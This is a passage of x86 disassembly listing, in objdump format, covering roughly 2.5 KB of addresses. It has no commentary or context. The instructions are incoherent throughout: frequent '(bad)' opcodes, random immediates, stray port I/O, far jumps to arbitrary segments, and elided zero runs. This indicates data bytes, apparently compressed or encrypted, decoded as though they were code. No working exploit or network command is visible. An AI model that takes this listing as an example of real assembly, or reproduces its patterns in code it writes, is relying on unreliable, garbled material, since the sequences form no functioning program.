  41deb3:	jle    0x41df04
  41deb5:	sbb    DWORD PTR [ebx],esi
  41deb7:	in     al,0x39
  41deb9:	cld    
  41deba:	adc    al,0xc5
  41debc:	xchg   ebp,eax
  41debd:	adc    esi,DWORD PTR [esi+0x500a7b4d]
  41dec3:	adc    eax,0xd35a4a8b
  41dec8:	push   ebx
  41dec9:	xchg   edi,eax
  41deca:	push   es
  41decb:	out    dx,eax
  41decc:	push   edx
  41decd:	(bad)  
  41dece:	mov    ds:0x91f12c79,al
  41ded3:	mov    bh,0x97
  41ded5:	retf   0x28ef
  41ded8:	push   es
  41ded9:	in     al,0xcf
  41dedb:	call   0x875f:0x6611bf4f
  41dee2:	rcr    DWORD PTR ds:0xde9f0f6d,0xbc
  41dee9:	push   edi
  41deea:	inc    ecx
  41deeb:	push   0x8f5b7696
  41def0:	in     eax,0xa7
  41def2:	dec    esp
  41def3:	ins    BYTE PTR es:[edi],dx
  41def4:	sbb    DWORD PTR [edi+0x5a2f3f31],0xa
  41defb:	pop    esi
  41defc:	dec    ebp
  41defd:	clc    
  41defe:	sbb    edx,DWORD PTR [eax]
  41df00:	mul    al
  41df02:	lds    ebx,FWORD PTR [esi]
  41df04:	mov    esi,0x9be926f4
  41df09:	or     al,0xc8
  41df0b:	sahf   
  41df0c:	pop    esi
  41df0d:	mov    cl,0x6e
  41df0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df10:	and    al,BYTE PTR [eax]
	...
  41df72:	add    BYTE PTR [eax],al
  41df74:	aas    
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0x1c699ce9
  41df82:	inc    edx
  41df83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df84:	repz add DWORD PTR ds:[eax],eax
  41df88:	add    eax,0x95000001
  41df8d:	adc    DWORD PTR [edi+0x78],ebx
  41df90:	(bad)  
  41df91:	inc    eax
  41df92:	push   esi
  41df93:	dec    edx
  41df94:	sub    eax,0x24704c65
  41df99:	jne    0x41dfac
  41df9b:	mov    dh,0x84
  41df9d:	int    0x4c
  41df9f:	push   edi
  41dfa0:	xchg   esi,eax
  41dfa1:	mov    dl,0xdd
  41dfa3:	rep lods al,BYTE PTR ds:[esi]
  41dfa5:	lock xchg DWORD PTR [ebp+0x751baf5],ecx
  41dfac:	jge    0x41e00d
  41dfae:	sbb    al,BYTE PTR [ecx]
  41dfb0:	aam    0xc
  41dfb2:	or     esp,DWORD PTR [edx-0x80]
  41dfb5:	aam    0xd5
  41dfb7:	out    dx,al
  41dfb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfb9:	imul   ecx,DWORD PTR [edx+0x2b],0xe6baf865
  41dfc0:	fs int 0xe7
  41dfc3:	fnstenv [edi]
  41dfc5:	pop    ds
  41dfc6:	and    eax,0xd0025084
  41dfcb:	loop   0x41df77
  41dfcd:	call   0xf4ca3f17
  41dfd2:	aam    0x2
  41dfd4:	pop    edi
  41dfd5:	test   BYTE PTR [eax-0x1ae53337],ah
  41dfdb:	popf   
  41dfdc:	shr    BYTE PTR [edx],1
  41dfde:	mov    bh,0x44
  41dfe0:	xchg   ecx,eax
  41dfe1:	mov    esi,0x5ed7bb9f
  41dfe6:	leave  
  41dfe7:	pop    edi
  41dfe8:	int3   
  41dfe9:	aas    
  41dfea:	add    dh,al
  41dfec:	push   es
  41dfed:	and    esp,DWORD PTR [ebp-0x15]
  41dff0:	mov    bl,0xcf
  41dff2:	add    DWORD PTR [ecx-0xeecceb7],ebp
  41dff8:	das    
  41dff9:	test   eax,0xfaead208
  41dffe:	shl    BYTE PTR [ebx-0xf],0x99
  41e002:	fist   DWORD PTR [esi+0x59b2d5dd]
  41e008:	adc    DWORD PTR [esi+0x7b],edx
  41e00b:	scas   eax,DWORD PTR es:[edi]
  41e00c:	push   edx
  41e00d:	jnp    0x41e075
  41e00f:	xchg   ebx,eax
  41e010:	fcmovnu st,st(7)
  41e012:	and    al,0x23
  41e014:	(bad)  
  41e015:	fldcw  WORD PTR [eax+ecx*4+0x4d]
  41e019:	dec    esp
  41e01a:	mov    al,0x9b
  41e01c:	mov    ch,0x83
  41e01e:	push   es
  41e01f:	test   eax,0x66a3cdc8
  41e024:	fld    TBYTE PTR [esi]
  41e026:	dec    ebx
  41e027:	adc    ecx,ebp
  41e029:	sub    al,0x62
  41e02b:	pop    edi
  41e02c:	xlat   BYTE PTR ds:[ebx]
  41e02d:	out    dx,eax
  41e02e:	iret   
  41e02f:	pop    ebx
  41e030:	jne    0x41e00b
  41e032:	pop    esi
  41e033:	push   edi
  41e034:	inc    DWORD PTR [eax-0x73]
  41e037:	cwde   
  41e038:	bound  edi,QWORD PTR [edi]
  41e03a:	jbe    0x41e01c
  41e03c:	repnz stos BYTE PTR es:[edi],al
  41e03e:	push   es
  41e03f:	(bad)  
  41e040:	push   es
  41e041:	mov    dl,0x41
  41e043:	fsubp  st(3),st
  41e045:	cwde   
  41e046:	sti    
  41e047:	(bad)  
  41e048:	push   ecx
  41e049:	xchg   ebp,eax
  41e04a:	push   ss
  41e04b:	addr16 adc al,0x80
  41e04e:	mov    dl,0xd1
  41e050:	mov    ch,0xfc
  41e053:	sbb    ch,dl
  41e055:	out    0xa3,eax
  41e057:	push   edi
  41e058:	ja     0x41e07c
  41e05a:	arpl   WORD PTR [edx-0x52],bp
  41e05d:	pop    ss
  41e05e:	xchg   esp,eax
  41e05f:	aam    0x33
  41e061:	mov    ah,0x14
  41e063:	fucomi st,st(5)
  41e065:	pop    ds
  41e066:	cmp    ah,0x21
  41e069:	test   eax,0xb3c2b2d6
  41e06e:	pop    ebx
  41e06f:	and    DWORD PTR [eax+0x1e],0x1bebed43
  41e076:	xor    eax,0xb7ac2635
  41e07b:	add    esi,DWORD PTR [ebp+0x634a9c9f]
  41e081:	popf   
  41e082:	aam    0xc
  41e084:	sahf   
  41e085:	nop
  41e086:	sub    DWORD PTR [ebx-0x98883fc],ebx
  41e08c:	mov    edi,0xee64f04d
	...
  41e0f1:	add    BYTE PTR [eax],al
  41e0f3:	add    BYTE PTR [edi+0x53],cl
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	data16 sti 
  41e102:	test   eax,0x13ff87a
  41e107:	add    BYTE PTR ds:0xa0000001,al
  41e10d:	dec    eax
  41e10e:	in     al,0x7d
  41e110:	mov    edi,DWORD PTR [esi+0x305e5c26]
  41e116:	xchg   ecx,eax
  41e117:	mov    al,ds:0x71c9b381
  41e11c:	and    eax,0xd44a921f
  41e121:	(bad)  
  41e122:	out    dx,eax
  41e123:	add    BYTE PTR [eax+0x39],bl
  41e126:	sbb    eax,0x5fb22562
  41e12b:	mov    esi,0x4977071e
  41e130:	mov    ds:0x73824631,eax
  41e135:	test   DWORD PTR [esi+0x4e],ebx
  41e138:	outs   dx,DWORD PTR ds:[esi]
  41e139:	mov    cl,0x64
  41e13b:	or     eax,0x6fcd7751
  41e141:	adc    ecx,DWORD PTR [edx]
  41e143:	mov    al,0x21
  41e145:	aad    0xd9
  41e147:	aam    0x6d
  41e149:	ds mov dh,0x65
  41e14c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e14d:	not    DWORD PTR [edx+0x6b81b282]
  41e153:	pusha  
  41e154:	mov    WORD PTR [esi-0x3c],es
  41e157:	pop    esp
  41e158:	push   esp
  41e159:	stos   DWORD PTR es:[edi],eax
  41e15a:	aam    0x10
  41e15c:	pop    ebp
  41e15d:	shr    esp,0xf7
  41e160:	mov    esi,0x43f11593
  41e165:	push   ebx
  41e166:	arpl   WORD PTR [edx],ax
  41e168:	psubusw mm6,QWORD PTR [ebp+0x3a5fae33]
  41e16f:	cmp    al,0x94
  41e171:	xlat   BYTE PTR ds:[ebx]
  41e172:	sbb    dh,dl
  41e174:	xor    al,bh
  41e176:	cmp    BYTE PTR [eax],bl
  41e178:	popf   
  41e179:	iret   
  41e17a:	push   edi
  41e17b:	mov    dh,0x61
  41e17d:	xor    eax,0x56142a04
  41e182:	xchg   edi,eax
  41e183:	into   
  41e184:	clc    
  41e185:	and    esp,DWORD PTR [edi+0x7ffb86a]
  41e18b:	stc    
  41e18c:	jmp    0x41e18d
  41e18e:	gs (bad) 
  41e190:	sub    dh,BYTE PTR [ebx]
  41e192:	and    al,0x9
  41e194:	ss push edi
  41e196:	jmp    0x2842:0x47740d69
  41e19d:	loope  0x41e1fd
  41e19f:	cmp    cl,bl
  41e1a1:	add    eax,0xb3a03745
  41e1a6:	mov    edx,DWORD PTR [eax+0xc]
  41e1a9:	rcl    BYTE PTR [edi+ebx*2+0x2c8beb71],0x2
  41e1b1:	add    bh,BYTE PTR [ecx]
  41e1b3:	iret   
  41e1b4:	cli    
  41e1b5:	jge    0x41e1a2
  41e1b7:	mov    al,ch
  41e1b9:	shl    bh,cl
  41e1bb:	sub    BYTE PTR cs:[esi-0x4b1f2037],bl
  41e1c2:	gs in  al,dx
  41e1c4:	push   ecx
  41e1c5:	pop    eax
  41e1c6:	pushf  
  41e1c7:	fild   WORD PTR [eax+0x582c2798]
  41e1cd:	dec    esi
  41e1ce:	xchg   ebx,eax
  41e1cf:	call   0xa57c103b
  41e1d4:	mov    esp,0x8e1ee8fd
  41e1d9:	fbstp  TBYTE PTR [ebx-0x59fdeb10]
  41e1df:	mov    eax,0xe975dc0f
  41e1e4:	sub    eax,0x5ef4ca6e
  41e1e9:	push   ecx
  41e1ea:	xor    ecx,DWORD PTR [eax-0x6a6924ff]
  41e1f0:	add    DWORD PTR [eax-0x6ef0915d],ecx
  41e1f6:	sbb    DWORD PTR gs:[edx+0x398bcaf2],edx
  41e1fd:	pop    es
  41e1fe:	xchg   esp,eax
  41e1ff:	imul   esp,ebp,0xfec3086c
  41e205:	mov    bl,0x60
  41e207:	push   ebx
  41e208:	cmp    BYTE PTR [ecx],al
  41e20a:	adc    esp,DWORD PTR [eax+0x7e]
  41e20d:	mov    BYTE PTR [eax],dl
  41e20f:	jmp    0x0:0x8b
	...
  41e272:	add    BYTE PTR [eax],al
  41e274:	stos   DWORD PTR es:[edi],eax
  41e275:	add    dh,BYTE PTR [edi-0x1a]
  41e278:	push   edi
  41e27a:	mov    ebx,0x6f64c34f
  41e27f:	or     al,0x91
  41e281:	push   ebp
  41e282:	or     BYTE PTR [ebp-0x3],bh
  41e285:	inc    eax
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    eax,0xec000001
  41e28d:	and    ebx,DWORD PTR [eax-0x54928a6d]
  41e293:	mov    BYTE PTR [ebp+0x1733acd7],0x4d
  41e29a:	nop
  41e29b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e29c:	push   ss
  41e29d:	dec    eax
  41e29e:	lahf   
  41e29f:	jecxz  0x41e249
  41e2a1:	jbe    0x41e313
  41e2a3:	mov    bl,0x55
  41e2a5:	imul   eax,ecx,0x8e915fe0
  41e2ab:	mov    edi,es
  41e2ad:	sbb    eax,0x5ce7a781
  41e2b2:	sub    BYTE PTR [ebx-0x13],0xc8
  41e2b6:	xor    ecx,0xd88cafc9
  41e2bc:	sub    bh,BYTE PTR [edx-0x48]
  41e2bf:	outs   dx,BYTE PTR ds:[esi]
  41e2c0:	sahf   
  41e2c1:	mov    ch,0x2e
  41e2c3:	and    ah,BYTE PTR [ebp-0x54]
  41e2c6:	push   esp
  41e2c7:	and    al,BYTE PTR [eax+ebx*2+0x16d1d659]
  41e2ce:	jmp    0x41e283
  41e2d0:	pop    eax
  41e2d1:	arpl   ax,ax
  41e2d3:	and    BYTE PTR [ebx+eiz*1+0x6b],0x7c
  41e2d8:	mov    ds:0xf2e6367e,al
  41e2dd:	xor    BYTE PTR [ebx],cl
  41e2df:	jmp    0x6d27:0x61be0b50
  41e2e6:	jno    0x41e274
  41e2e8:	retf   0x8a2a
  41e2eb:	cmp    DWORD PTR [esi],eax
  41e2ed:	adc    edi,DWORD PTR [eiz*8+0x1ddcd170]
  41e2f4:	add    al,0x1
  41e2f6:	hlt    
  41e2f7:	loopne 0x41e315
  41e2f9:	jmp    0x3450:0x2189986d
  41e300:	adc    eax,0x123780dd
  41e305:	cmp    BYTE PTR [edi-0x77107f56],0x73
  41e30c:	or     ebx,eax
  41e30e:	or     al,0x2f
  41e310:	ret    0xd147
  41e313:	lds    edi,FWORD PTR [ecx+esi*8-0x6e4ceed9]
  41e31a:	jo     0x41e2c7
  41e31c:	out    dx,eax
  41e31d:	xor    dh,bl
  41e31f:	std    
  41e320:	jb     0x41e334
  41e322:	ret    0xffc1
  41e325:	addr16 inc esi
  41e327:	adc    al,0xc6
  41e329:	test   eax,0x5055f65b
  41e32e:	and    al,0x3a
  41e330:	test   al,0xda
  41e332:	call   0x7d0831ae
  41e337:	pushf  
  41e338:	pushf  
  41e339:	addr16 or ah,ch
  41e33c:	addr16 jl 0x41e3ad
  41e33f:	xchg   ebx,eax
  41e340:	ror    DWORD PTR [ecx],0x2a
  41e343:	jl     0x41e366
  41e345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e346:	push   ebx
  41e347:	pop    esp
  41e348:	icebp  
  41e349:	push   ds
  41e34a:	mov    ds:0xf02c80f1,eax
  41e34f:	int3   
  41e350:	jg     0x41e308
  41e352:	cmc    
  41e353:	ret    0x1ce3
  41e356:	ins    BYTE PTR es:[edi],dx
  41e357:	(bad)  
  41e358:	xchg   ecx,eax
  41e359:	mov    DWORD PTR [edx-0x6b84a2b8],ebx
  41e35f:	ja     0x41e3b5
  41e361:	aam    0x20
  41e363:	mov    al,0x38
  41e365:	xchg   ebp,eax
  41e366:	(bad)  
  41e367:	xchg   ebx,eax
  41e368:	inc    ebx
  41e369:	pop    eax
  41e36a:	fistp  QWORD PTR [eax+0x44e7c6e9]
  41e370:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e371:	cld    
  41e372:	add    cl,BYTE PTR [edi+0x316cc4ec]
  41e378:	xchg   ebx,eax
  41e379:	pop    ebx
  41e37a:	cld    
  41e37b:	push   ds
  41e37c:	popf   
  41e37d:	cmp    dl,0x72
  41e380:	scas   eax,DWORD PTR es:[edi]
  41e381:	fwait
  41e382:	push   ds
  41e383:	nop
  41e384:	add    eax,0xc087ff82
  41e389:	mov    esi,0x419c8e2e
  41e38e:	mov    edx,0xd09f
	...
  41e3f3:	add    BYTE PTR [ecx-0xe088ee],cl
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0x9be43309
  41e403:	aas    
  41e404:	add    al,BYTE PTR [edx+0x1]
  41e407:	add    BYTE PTR ds:0xf8000001,al
  41e40d:	imul   esp
  41e40f:	jg     0x41e42f
  41e411:	imul   edi,DWORD PTR [ebx],0xffffffc6
  41e414:	lahf   
  41e415:	out    dx,eax
  41e416:	bound  esp,QWORD PTR [eax-0x7e0eb398]
  41e41c:	shr    BYTE PTR [eax+ecx*1+0x3c],1
  41e420:	push   cs
  41e421:	inc    ebp
  41e422:	out    0x67,eax
  41e424:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e425:	push   ebp
  41e426:	out    0x9,al
  41e428:	cld    
  41e429:	pop    ecx
  41e42a:	arpl   WORD PTR es:[edi-0x3d],bp
  41e42e:	or     BYTE PTR [eax+0x50],dl
  41e431:	and    ebx,edx
  41e433:	inc    esi
  41e434:	into   
  41e435:	retf   
  41e436:	and    cl,bl
  41e438:	dec    esi
  41e439:	outs   dx,BYTE PTR ds:[esi]
  41e43a:	push   ss
  41e43b:	(bad)  
  41e43d:	sbb    edx,0xa8adb8fd
  41e443:	int    0x88
  41e445:	xor    BYTE PTR [ebx-0x5],ah
  41e448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e449:	mov    ds:0x26e9d86,al
  41e44e:	add    bl,BYTE PTR [ebx-0x19]
  41e451:	cmp    al,0xd2
  41e453:	lea    ebp,[edi]
  41e455:	(bad)  
  41e456:	cmp    al,0xe6
  41e458:	mov    edi,DWORD PTR [ecx+0x2fe28fcf]
  41e45e:	enter  0x9a58,0xb9
  41e462:	mov    ah,0x21
  41e464:	addr16 int 0xeb
  41e467:	mov    ecx,esi
  41e469:	(bad)  
  41e46b:	mov    esp,0x520e2895
  41e470:	(bad)  
  41e471:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e472:	mov    al,fs:0xe1f0852b
  41e478:	in     al,dx
  41e479:	retf   0xaa43
  41e47c:	adc    eax,0x6cbe1ee5
  41e481:	jo     0x41e409
  41e483:	(bad)  
  41e484:	mov    eax,ds:0x87d18b1a
  41e489:	loopne 0x41e468
  41e48b:	cmc    
  41e48c:	retf   
  41e48d:	ret    
  41e48e:	push   es
  41e48f:	mov    al,ds:0xebf04519
  41e494:	outs   dx,BYTE PTR ds:[esi]
  41e495:	adc    ch,al
  41e497:	jbe    0x41e466
  41e499:	dec    esp
  41e49a:	cmp    DWORD PTR [ecx],ebx
  41e49c:	leave  
  41e49d:	xor    eax,ebx
  41e49f:	mov    edi,0xa35981c8
  41e4a4:	in     eax,0x5b
  41e4a6:	adc    al,0xc2
  41e4a8:	or     eax,0x590c24af
  41e4ad:	ins    DWORD PTR es:[edi],dx
  41e4ae:	cli    
  41e4af:	and    BYTE PTR ds:0xc8d7400a,cl
  41e4b5:	adc    edi,edi
  41e4b7:	ins    DWORD PTR es:[edi],dx
  41e4b8:	xor    ebx,DWORD PTR [edi+0x3f]
  41e4bb:	dec    esp
  41e4bc:	in     eax,0xab
  41e4be:	adc    DWORD PTR [ebp+0x6a1438fc],ebp
  41e4c4:	es nop
  41e4c6:	jae    0x41e4ac
  41e4c8:	stc    
  41e4c9:	je     0x41e495
  41e4cb:	dec    esp
  41e4cc:	or     al,0x6a
  41e4ce:	outs   dx,BYTE PTR fs:[esi]
  41e4d0:	icebp  
  41e4d1:	jne    0x41e488
  41e4d3:	mov    ebp,0x64609adc
  41e4d8:	(bad)  
  41e4d9:	out    0xb6,al
  41e4db:	add    esi,DWORD PTR [esi-0x21ee0798]
  41e4e1:	sub    dl,bl
  41e4e3:	sbb    bh,BYTE PTR [ecx]
  41e4e5:	prefetchw (bad)
  41e4e6:	or     eax,0xf80cb1cf
  41e4eb:	cwde   
  41e4ec:	fadd   QWORD PTR [esp+eax*4-0x612852bb]
  41e4f3:	retf   
  41e4f4:	adc    edx,edx
  41e4f6:	push   eax
  41e4f7:	(bad)  
  41e4f8:	fdecstp 
  41e4fa:	sbb    eax,0x26550aab
  41e4ff:	fist   WORD PTR [eax]
  41e501:	cmp    BYTE PTR [ebx-0x3a],dh
  41e504:	jmp    0x67c0:0x65c43073
  41e50b:	cmc    
  41e50c:	jmp    0x41e4d9
  41e50e:	sbb    eax,0xf88
	...
  41e573:	add    BYTE PTR [eax],ah
  41e575:	push   0xffffffcb
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e5dd
  41e581:	lahf   
  41e582:	std    
  41e583:	lock pop es
  41e585:	inc    ebx
  41e586:	add    DWORD PTR [eax],eax
  41e588:	add    eax,0x4a000001
  41e58d:	sbb    eax,0xee801969
  41e592:	sahf   
  41e593:	jmp    0xe25162f7
  41e598:	pop    ss
  41e599:	out    0x13,al
  41e59b:	xor    esp,DWORD PTR [ecx+0x5307ae37]
  41e5a1:	push   ebp
  41e5a2:	stos   DWORD PTR es:[edi],eax
  41e5a3:	(bad)  
  41e5a5:	jae    0x41e55b
  41e5a7:	mov    edx,0x84e51b4a
  41e5ac:	shl    BYTE PTR [ebx+0x686d0641],1
  41e5b2:	lods   eax,DWORD PTR ds:[esi]
  41e5b3:	mov    esp,0x73e52a20
  41e5b8:	addr16 jnp 0x41e580
  41e5bb:	and    BYTE PTR [edx],dl
  41e5bd:	push   esi
  41e5be:	bound  esi,QWORD PTR [ecx-0x4cd47d46]
  41e5c4:	(bad)  
  41e5c5:	sar    BYTE PTR [esi],1
  41e5c7:	mov    esi,0x1e644bad
  41e5cc:	fcomi  st,st(3)
  41e5ce:	aas    
  41e5cf:	dec    eax
  41e5d0:	pop    edi
  41e5d1:	mov    dh,0x7a
  41e5d3:	ins    DWORD PTR es:[edi],dx
  41e5d4:	inc    eax
  41e5d5:	xchg   ecx,eax
  41e5d6:	in     al,0x27
  41e5d8:	sti    
  41e5d9:	test   al,0x8a
  41e5db:	test   BYTE PTR [ecx],dl
  41e5dd:	xchg   BYTE PTR [ebx-0x19470040],ah
  41e5e3:	outs   dx,DWORD PTR ds:[esi]
  41e5e4:	push   ds
  41e5e5:	and    edi,DWORD PTR [esp+esi*1]
  41e5e8:	mov    ecx,0x91d68b0f
  41e5ed:	dec    ebp
  41e5ee:	inc    esp
  41e5ef:	xor    edi,DWORD PTR [eax+0x39]
  41e5f2:	fwait
  41e5f3:	mov    ecx,0xf3166463
  41e5f8:	jl     0x41e63d
  41e5fa:	push   0x77e88496
  41e5ff:	or     eax,0x6e731977
  41e604:	xor    cl,BYTE PTR [ebx-0x74c62525]
  41e60a:	shl    BYTE PTR [edi-0x747d4455],1
  41e610:	lods   eax,DWORD PTR ds:[esi]
  41e611:	retf   
  41e612:	or     edx,edx
  41e614:	jne    0x41e68b
  41e616:	mov    edi,0x7312becd
  41e61b:	mov    ebx,0xdf2bf606
  41e620:	je     0x41e665
  41e622:	sub    BYTE PTR [edi],cl
  41e624:	jl     0x41e62a
  41e626:	jmp    0xefa2:0xd9432953
  41e62d:	icebp  
  41e62e:	mov    edi,0x6e646840
  41e633:	repnz sub eax,DWORD PTR [ebx+0x45]
  41e637:	xlat   BYTE PTR ds:[ebx]
  41e638:	xor    bl,dl
  41e63a:	cmp    BYTE PTR [edx+0xf32aff5],al
  41e640:	dec    BYTE PTR [edx-0x5037b2da]
  41e646:	(bad)  
  41e648:	ins    DWORD PTR es:[edi],dx
  41e649:	mov    edi,0x6bdbda5e
  41e64e:	scas   eax,DWORD PTR es:[edi]
  41e64f:	jne    0x41e66e
  41e651:	fdiv   DWORD PTR [eax+0x42]
  41e654:	ja     0x41e6b4
  41e656:	jo     0x41e6cd
  41e658:	adc    al,bl
  41e65a:	sbb    eax,0xb9c8dcd2
  41e65f:	push   cs
  41e660:	adc    edx,ebp
  41e662:	mov    ebp,0x12d46d72
  41e667:	(bad)  
  41e668:	mov    esi,0x65ea78e1
  41e66d:	and    eax,0xd124ed44
  41e672:	push   esp
  41e673:	call   0x9bd7:0xbaba7cd7
  41e67a:	inc    edi
  41e67b:	sub    DWORD PTR ds:[ebx],eax
  41e67e:	in     eax,0x1b
  41e680:	imul   esi,DWORD PTR [ecx+edi*2],0xffffffba
  41e684:	jno    0x41e654
  41e686:	loopne 0x41e696
  41e688:	or     DWORD PTR [edi],esi
  41e68a:	aad    0x6d
  41e68c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e68d:	mov    ds:0xb40c34,eax
	...
  41e6f2:	add    BYTE PTR [eax],al
  41e6f4:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e6fa:	cmc    
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    esi,ecx
  41e701:	ins    BYTE PTR es:[edi],dx
  41e702:	mov    al,ds:0x1440cb4
  41e707:	add    BYTE PTR ds:0xe6000001,al
  41e70d:	sahf   
  41e70e:	sbb    eax,0x97353b1
  41e713:	icebp  
  41e714:	push   ebx
  41e715:	lea    esp,[edx]
  41e717:	iret   
  41e718:	add    eax,0x7e7b6876
  41e71d:	sti    
  41e71e:	rcr    al,0xa9
  41e721:	xor    DWORD PTR [esi],0xffffffdf
  41e724:	add    al,0x89
  41e726:	pusha  
  41e727:	xchg   DWORD PTR [ebx],ecx
  41e729:	mov    DWORD PTR [edi],ebp
  41e72b:	sub    ebp,DWORD PTR [esi-0x17]
  41e72e:	xchg   esi,eax
  41e72f:	mov    esp,0x795739df
  41e734:	xchg   ebp,eax
  41e735:	mov    edi,0x762bfe5c
  41e73a:	adc    ebp,DWORD PTR [ebx-0x5c7e6a94]
  41e740:	mov    esi,0xca33adb7
  41e745:	dec    ebx
  41e746:	ror    ebp,cl
  41e748:	push   ss
  41e749:	js     0x41e717
  41e74b:	pop    edi
  41e74c:	xchg   BYTE PTR [ebx],bh
  41e74e:	outs   dx,BYTE PTR ds:[esi]
  41e74f:	cld    
  41e750:	sbb    BYTE PTR [ebx],ch
  41e752:	pop    ss
  41e753:	sahf   
  41e754:	clc    
  41e755:	mov    al,ds:0xec13dca7
  41e75a:	dec    ebx
  41e75b:	mov    eax,ds:0x315c3086
  41e760:	dec    ebp
  41e761:	push   ds
  41e762:	sbb    DWORD PTR [ecx-0x70],0xa4f4dfe6
  41e769:	popf   
  41e76a:	jp     0x41e6f1
  41e76c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e76d:	jge    0x41e735
  41e76f:	enter  0x4d8a,0xe3
  41e773:	mov    edi,0x2fb36dad
  41e778:	mov    ds:0x760c35df,al
  41e77d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e77e:	inc    ebx
  41e77f:	push   ecx
  41e780:	pop    esp
  41e781:	scas   al,BYTE PTR es:[edi]
  41e782:	into   
  41e783:	xchg   edi,eax
  41e784:	mov    edx,0x18cbfa66
  41e789:	dec    eax
  41e78a:	sub    DWORD PTR [ebx],esi
  41e78c:	cwde   
  41e78d:	xor    bl,BYTE PTR [esi-0x69]
  41e790:	and    eax,0xb0ab7fbe
  41e795:	push   ss
  41e796:	ret    
  41e797:	retf   
  41e798:	jno    0x41e7bf
  41e79a:	fcom   QWORD PTR [esp+eiz*2+0x22e84b1a]
  41e7a1:	(bad)  
  41e7a2:	jge    0x41e7fe
  41e7a4:	mov    BYTE PTR [ecx+ecx*1-0x5b],bh
  41e7a8:	push   esi
  41e7a9:	dec    ebp
  41e7aa:	cli    
  41e7ab:	xlat   BYTE PTR ds:[ebx]
  41e7ac:	and    BYTE PTR [edx],dh
  41e7ae:	int    0xc9
  41e7b0:	adc    BYTE PTR [ebx],0xae
  41e7b3:	xchg   esi,eax
  41e7b4:	dec    esp
  41e7b5:	mov    edx,edi
  41e7b7:	jns    0x41e7f8
  41e7b9:	lods   eax,DWORD PTR ds:[esi]
  41e7ba:	mov    cl,0xf3
  41e7bc:	sub    eax,0x26006860
  41e7c1:	jnp    0x41e7a9
  41e7c3:	ds ret 0x7bc8
  41e7c7:	pusha  
  41e7c8:	sti    
  41e7c9:	popf   
  41e7ca:	jg     0x41e826
  41e7cc:	mov    ebx,0x14f123cf
  41e7d1:	jp     0x41e825
  41e7d3:	mov    DWORD PTR fs:[edx+ebp*2-0x40bb69c9],eax
  41e7db:	les    edi,FWORD PTR [esi+0x1db0e5b8]
  41e7e1:	or     esi,ecx
  41e7e3:	aad    0x96
  41e7e5:	stos   DWORD PTR es:[edi],eax
  41e7e6:	in     eax,0xf
  41e7e8:	mov    esi,0x14746073
  41e7ed:	pop    ds
  41e7ee:	stos   DWORD PTR es:[edi],eax
  41e7ef:	dec    eax
  41e7f0:	cwde   
  41e7f1:	adc    al,BYTE PTR [ebx-0x3d]
  41e7f4:	mov    bh,0xc7
  41e7f6:	sub    edx,esi
  41e7f8:	pop    ecx
  41e7f9:	sar    dh,cl
  41e7fb:	mov    al,0x1c
  41e7fd:	cli    
  41e7fe:	repz out 0xa,al
  41e801:	pop    ds
  41e802:	sbb    BYTE PTR [edx-0x73],cl
  41e805:	xchg   esp,eax
  41e806:	push   es
  41e807:	sub    dh,0x6a
  41e80a:	xor    al,0x5e
  41e80c:	fsubr  DWORD PTR [ebx+eiz*2-0x75]
  41e810:	add    DWORD PTR [eax],0x0
	...
  41e872:	add    BYTE PTR [eax],al
  41e874:	sub    eax,0x9e5c8a39
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e863
  41e881:	hlt    
  41e882:	std    
  41e883:	xor    dl,BYTE PTR [ecx]
  41e885:	inc    ebp
  41e886:	add    DWORD PTR [eax],eax
  41e888:	add    eax,0xe2000001
  41e88d:	stos   BYTE PTR es:[edi],al
  41e88e:	adc    ch,dl
  41e890:	rcl    BYTE PTR [ebp+0x37],cl
  41e893:	imul   esp,DWORD PTR [edi+eiz*4],0x472ac57b
  41e89a:	jecxz  0x41e84c
  41e89c:	aas    
  41e89d:	mov    edx,DWORD PTR [ebp-0x3944d75]
  41e8a3:	out    dx,al
  41e8a4:	ret    0x3a11
  41e8a7:	call   0x8b5b9516
  41e8ac:	sar    DWORD PTR [esi+0x2ecaf9b3],0xd6
  41e8b3:	inc    ecx
  41e8b4:	jns    0x41e897
  41e8b6:	pop    ebx
  41e8b7:	sti    
  41e8b8:	pop    ecx
  41e8b9:	jg     0x41e918
  41e8bb:	mov    dh,0xb2
  41e8bd:	scas   al,BYTE PTR es:[edi]
  41e8be:	pop    ebx
  41e8bf:	ret    
  41e8c0:	sbb    eax,0x2a718866
  41e8c5:	and    DWORD PTR [esp+ebp*8],ecx
  41e8c8:	leave  
  41e8c9:	pop    ecx
  41e8ca:	and    DWORD PTR [edi+0x7d],ebx
  41e8cd:	adc    cl,BYTE PTR [ecx+edi*8]
  41e8d0:	dec    ecx
  41e8d1:	fimul  WORD PTR [ecx+0x7e]
  41e8d4:	dec    ebx
  41e8d5:	adc    eax,0x98451b2c
